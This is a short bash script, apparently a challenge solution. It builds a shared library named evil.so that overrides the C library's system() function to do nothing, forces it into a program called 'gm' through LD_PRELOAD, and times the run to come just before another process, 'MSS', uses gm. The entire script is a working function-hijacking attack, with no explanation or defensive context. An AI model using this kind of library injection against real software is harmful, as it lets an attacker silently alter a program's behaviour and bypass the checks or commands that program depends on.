#!/bin/bash

# This script will run right before MSS runs the gm program

# Wait for 98 seconds
sleep 98

# Create a shared library source file (example: evil.c)
echo 'int system(const char *command) { return 0; }' > evil.c

# Compile the shared library
gcc -shared -o evil.so -fPIC evil.c

# Set LD_PRELOAD to the path of the compiled shared library
export LD_PRELOAD=$(pwd)/evil.so

# Run the gm program with the desired numbers
./gm 9 8 10 24 75 9
